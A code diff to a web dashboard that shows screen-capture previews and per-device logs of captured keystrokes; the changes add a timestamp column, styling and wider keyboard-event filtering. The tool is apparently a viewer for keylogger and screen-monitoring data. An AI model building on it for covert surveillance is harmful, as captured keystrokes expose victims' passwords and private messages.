@@ -355,6 +355,17 @@
       .log-table tr:not(:last-child) td {
         border-bottom: 1px solid #212b37;
       }
+      .evt-time {
+        width: 130px;
+        color: #8b949e;
+        white-space: nowrap;
+      }
+      .evt-key {
+        color: #cfe8ff;
+      }
+      .evt-log-row:hover {
+        background: rgba(255, 255, 255, 0.03);
+      }
       .log-empty {
         padding: 18px;
         color: #8b949e;
@@ -494,6 +505,20 @@
           .replace(/"/g, '&quot;');
       }
 
+      function formatKeyboardEventTime(value) {
+        const raw = String(value || '').trim();
+        if (!raw) return '';
+        const date = new Date(raw);
+        if (!isNaN(date.getTime())) {
+          const hh = String(date.getHours()).padStart(2, '0');
+          const mm = String(date.getMinutes()).padStart(2, '0');
+          const ss = String(date.getSeconds()).padStart(2, '0');
+          const ms = String(date.getMilliseconds()).padStart(3, '0');
+          return `${hh}:${mm}:${ss}.${ms}`;
+        }
+        return escapeHtml(raw);
+      }
+
       function getDevices() {
         const devices = lastPayload?.devices || [];
         if (!devicesFilter) {
@@ -571,7 +596,7 @@
         statusDot.classList.remove('offline');
         previewTitle.textContent = formatDeviceTitle(selected);
         previewImage.src = buildImageUrl(selected);
-        const eventCount = Array.isArray(selected.keyboard_events) ? selected.keyboard_events.filter(e => e && e.type && (String(e.type).toLowerCase() === 'keyup')).length : 0;
+        const eventCount = Array.isArray(selected.keyboard_events) ? selected.keyboard_events.filter(e => e && e.type && ['keyup', 'key'].includes(String(e.type).toLowerCase())).length : 0;
         previewMeta.innerHTML = `Screen monitoring · ${selected.source || 'standalone-capture-app'} · ${selected.timestamp || 'Unknown time'} <span class="preview-badge">${eventCount} keyboard event${eventCount === 1 ? '' : 's'}</span>`;
         const debugInfo = document.getElementById('debugInfo');
         try {
@@ -627,7 +652,7 @@
 
           const eventDetail = document.createElement('div');
           eventDetail.className = 'device-detail';
-          const eventCount = Array.isArray(device.keyboard_events) ? device.keyboard_events.filter(e => e && e.type && String(e.type).toLowerCase() === 'press').length : 0;
+          const eventCount = Array.isArray(device.keyboard_events) ? device.keyboard_events.filter(e => e && e.type && ['press', 'key', 'keyup'].includes(String(e.type).toLowerCase())).length : 0;
           eventDetail.textContent = `${eventCount} keyboard event${eventCount === 1 ? '' : 's'}`;
 
           const status = document.createElement('div');
@@ -661,7 +686,7 @@
       }
 
       function renderKeyboardLog(events) {
-        // events is the original array from the device; we filter to only 'press' events
+        // events is the original array from the device; we filter to keyboard events only
         const original = Array.isArray(events) ? events : [];
         const filtered = [];
         const indices = [];
@@ -669,7 +694,7 @@
           const ev = original[i];
           if (!ev || !ev.type) continue;
           const t = String(ev.type).toLowerCase();
-          if (t === 'keyup') {
+          if (['keyup', 'key'].includes(t)) {
             filtered.push(ev);
             indices.push(i);
           }
@@ -689,8 +714,10 @@
           .reverse()
           .map((event, revIndex) => {
             const key = escapeHtml(event.key || '');
+            const time = formatKeyboardEventTime(event.time);
             return `
-              <tr>
+              <tr class="evt-log-row">
+                <td class="evt-time">${time}</td>
                 <td class="evt-key">${key}</td>
               </tr>
             `;
@@ -700,7 +727,7 @@
         logBody.innerHTML = `
           <table class="log-table">
             <thead>
-              <tr><th>Key</th></tr>
+              <tr><th>Time</th><th>Key</th></tr>
             </thead>
             <tbody>${rows}</tbody>
           </table>
@@ -785,13 +812,13 @@
       });
 
       clearLogButton.addEventListener('click', () => {
-        // Remove only key/press events from the selected device's event list
+        // Remove only keyboard events from the selected device's event list
         const selected = getSelectedDevice();
         if (selected && Array.isArray(selected.keyboard_events)) {
           const filtered = selected.keyboard_events.filter((ev) => {
             if (!ev || !ev.type) return true;
             const t = String(ev.type).toLowerCase();
-            return !(t === 'press' || t === 'key');
+            return !(['press', 'key', 'keyup'].includes(t));
           });
           selected.keyboard_events = filtered;
           if (lastPayload?.devices) {
